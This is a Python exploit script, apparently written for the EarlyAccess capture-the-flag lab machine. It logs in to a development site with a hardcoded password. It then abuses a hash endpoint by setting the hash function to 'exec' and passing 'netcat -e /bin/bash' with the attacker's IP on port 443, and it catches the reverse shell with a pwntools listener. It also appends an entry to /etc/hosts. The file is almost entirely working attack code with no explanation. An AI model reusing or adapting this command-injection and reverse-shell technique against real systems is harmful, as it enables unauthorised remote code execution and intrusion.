import requests
try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Shell Earlyaccess ~ GatoGamer1155\n")
except:
    print('\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n')
    exit(1)

if len(sys.argv) < 2:
    print(f"[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <ip>\n")
    exit(1)

os.system("echo '10.10.11.110 dev.earlyaccess.htb' >> /etc/hosts")

target = "http://dev.earlyaccess.htb/actions/"
ip = sys.argv[1]

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

def login():
    creds = {
    "password" : "gameover",
    }

    requests.post(target + "login.php", data=creds, verify=False)

def cmd():
    time.sleep(2)
    rev = {
        "action": "hash",
        "password": f"netcat -e /bin/bash {ip} 443",
        "hash_function": "exec",
        "debug": 1
    }

    requests.post(target + "hash.php", data=rev, verify=False)

login()
threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=60).wait_for_connection()
shell.sendline(b"export HOME=/var/www TERM=xterm")
shell.interactive()
